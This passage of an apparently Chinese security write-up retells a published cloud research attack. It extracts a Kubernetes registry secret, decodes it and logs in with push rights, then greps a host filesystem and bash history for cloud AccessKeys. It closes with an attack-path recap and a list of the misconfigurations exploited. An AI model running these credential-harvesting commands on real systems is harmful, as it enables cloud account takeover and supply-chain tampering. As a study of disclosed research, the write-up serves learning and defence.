代理进程，可用于控制本节点上的容器</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">kubectl</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">与 Kubernetes API 交互的命令行工具</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">多租户识别方式</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">Pod 命名、命名空间前缀、运行时间、实例 ID 差异</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">RBAC 最小权限</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">只授予组件操作所需的最小范围权限</span></section></td></tr></tbody></table>  
## 第四步：镜像仓库权限配置不当  
  
**除了列出pods, 我们还可以查看pod配置中用于创建这些pod的镜像, 经确认这些镜像用的都是同一个密钥.**  
```
// pod配置的一个片段，显示了私有容器镜像仓库的使用"spec":{    "containers":[        {            "image":"*REDACTED*.eu-central-1.aliyuncs.com/apsaradb_*REDACTED*/*REDACTED*",            "imagePullPolicy":"IfNotPresent",...                "imagePullSecrets":[        {            "name":"docker-image-secret"        }    ], 
```  
  
当前数据库平台使用了私有镜像仓库来托管 K8s 容器镜像，让我们查看一下配置中的imagePullSecret字段值。  
### 🔑 根据secret名称提取并解码 imagePullSecrets  
  
获取该 Secret ：  
```
$: /tmp/kubectl get secret -o json docker-image-secret {     "apiVersion": "v1",     "data": {         ".dockerconfigjson": "eyJhdXRoc*REDACTED*"    },     "kind": "Secret",     "metadata": {         "creationTimestamp": "2020-11-12T14:57:36Z",         "name": "docker-image-secret",         "namespace": "default",         "resourceVersion": "2705",         "selfLink": "/api/v1/namespaces/default/secrets/docker-image-secret",         "uid": "6cb90d8b-1557-467a-b398-ab988db27908"    },     "type": "kubernetes.io/dockerconfigjson"} 
```  
  
使用 base64 解码：  
```
echo <Base64> | base64 -d
```  
  
得到结果：  
```
{     "auths":{        "registry-vpc.eu-central-1.aliyuncs.com":{            "auth":"*REDACTED*",            "password":"*REDACTED*",            "username":"apsaradb*REDACTED*"        }    }} 
```  
### 🔐 测试仓库权限（禁止破坏生产环境）  
  
我们既然可以拿到账户密码， 意味着我们可以登陆到私有的镜像仓库，我们使用提取的凭据测试仓库登录并成功了：  
```
docker login http://镜像仓库地址 -u apsaradb_xxx -p <password>
```  
  
在针对容器映像注册表测试凭据后，我们发现我们不仅具有读访问权限，而且具有写权限。这意味着我们有能力覆盖仓库内的容器映像，并可以对整个服务和其他服务的映像执行供应链攻击。  
  
![img](https://mmbiz.qpic.cn/mmbiz_jpg/apmYTPAKhlVjGDcq7325ZqWKrzvwV4dwgINSB4feVXNQ7QbbFpXiaMu9S8QL0QVZq1a1ueq6BgvD36vy1r4bzUw/640?wx_fmt=other&from=appmsg "null")  
  
### 📘 需要掌握的知识点  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">类型</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">含义</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">imagePullSecret</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><strong style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));font-weight: bold;text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: inherit;color: rgb(250, 81, 81);"><span leaf="">Pod 拉取私有镜像时使用的认证配置（可包含仓库用户名密码）</span></strong></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">Registry 权限类型</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">pull-only（安全） vs push &amp; pull（高风险）</span></section></td></tr></tbody></table>  
### ✅ 总结  
  
在这一阶段中，我们：  
- • 从 K8s 配置中提取了镜像仓库认证信息  
  
- • 解码并成功登录阿里云私有仓库  
  
- • 该凭据还拥有上传权限（push access）  
  
- • **供应链攻击风险确认**  
  
## 第五步：更多敏感信息收集  
  
与我们进行的所有研究一样，我们尝试在文件系统上执行一次**secrets scan**  
，搜索宿主机文件系统中是否存在 AccessKey 和 SecretKey（AK/SK），账户密码等，进而访问更多资源，如对象存储 OSS、日志服务 SLS、数据库、ECS 等。  
### 🔍 从宿主机文件系统中搜索敏感凭据  
  
我们使用以下命令从容器 C 中挂载的宿主机目录 /mnt/  
 中查找敏感信息：  
```
# 搜索 AccessKey 格式（如 LTAI...）grep -rE 'LTAI' /mnt 2>/dev/null# 搜索 bash 历史记录cat /mnt/root/.bash_history# 搜索包含 key 的配置文件find /mnt -type f \( -iname '*.sh' -o -iname '*.json' -o -iname '*.conf' \) -exec grep -i 'access\|secret\|key' {} \;
```  
  
我们找到了大量凭据信息：  
```
/etc/*REDACTED*/custins/400480085/100333829/custins_job:LTAI*REDACTED*/opt/*REDACTED*/golang_extern_backend_sls.conf:LTAI4*REDACTED*/root/.bash_history:LTAI*REDACTED*/var/lib/*REDACTED*/data/errors-1182678.txt:LTAI4*REDACTED*/var/lib/docker/containers/1085d3b0xxxxxxx08543/config.v2.json:LTAI*REDACTED*
```  
  
这些凭据散落在配置文件、日志文件、脚本和历史命令中，说明开发与运维过程中存在环境配置不当的问题。  
### 🌐 凭据作用  
- • 接管 ECS，云平台的账户资源通常很多。  
  
- • 访问 OSS 资源, 进一步获取敏感数据  
  
- • 获取、删除或修改其他租户资源  
  
这意味着：我们可从平台漏洞扩展至整个云账户  
### ✅ 总结  
  
在攻击的最后阶段，我们利用容器逃逸和宿主机权限，成功定位并提取出多个长期有效 AK/SK 凭据。  
  
这些凭据本不应出现在宿主机系统上，却因凭据管理配置不当被保留下来，为我们打开了从平台漏洞扩展至云资源控制面的通道。  
## 回顾  
### 🎯 攻击路径  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">阶段</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">操作点</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">权限提升</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">第一步</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">利用 tsar cronjob + 可写动态库</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">adbpgadmin → root（容器A内）</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">第二步</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">共享 PID + 共享家目录 + SSH 注入</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">root（容器A） → 容器B（横向）</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf=""><br/></span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">利用 docker.sock 创建新持久化特权容器</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">容器B → 容器C（宿主机级别）</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">第三步</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">访问 API Server</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">控制 Kubernetes 多租户集群</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">第四步</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">获取 imagePullSecret 凭据</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">可向私有仓库推送恶意镜像（供应链）</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">第五步</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">搜索宿主机中的 AK/SK 凭据</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">获取云控制面权限，横向扩展拿下更多云资源权限</span></section></td></tr></tbody></table>  
### 📌 关键失误点  
1. 1. **计划任务执行程序加载用户可控动态库**  
（本地提权）  
  
1. 2. **Pod 间共享 PID 命名空间与 Volume**  
（容器间横向移动）  
  
1. 3. **docker.sock 暴露 + 特权容器**  
（容器逃逸）  
  
1. 4. **kubelet 凭据权限过高**  
（集群资源泄露）  
  
1. 5. **Registry 凭据包含 push 权限**  
（供应链污染）  
  
1. 6. **宿主机遗留明文 AK/SK,权限过大**  
（云边界突破）  
  
## LINKS：  
  
**参考链接**  
  
https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r  
  
**学习拓展：**  
  
busybox : https://busybox.net/about.html  
  
PatchELF: https://github.com/NixOS/patchelf  
  
共享pid命名空间: https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/#understanding-process-namespace-sharing  
  
ssh LocalCommand: https://linux.die.net/man/5/ssh_config  
  
反弹shell: https://www.wiz.io/academy/reverse-shell-attacks  
  
docker api 指南: https://docs.docker.com/engine/api/v1.40/  
  
Kubelet: https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/  
  
pod中的imagePullSecrets: https://kubernetes.io/docs/concepts/containers/images/#specifying-imagepullsecrets-on-a-pod  
  
**视频资料：**  
  
B站关注   
**Umbrella枇杷哥**  
，up主分享了云安全专题系列视频，包括对wiz相关靶场关卡的分析，扩展了实战中的思路和知识点是其他单纯的wp中没有的。  
  
**wiz靶场：**  
  
EKS Cluster Games: https://eksclustergames.com/  
  
K8s Lan Party: https://k8slanparty.com/  
  
   
  
  
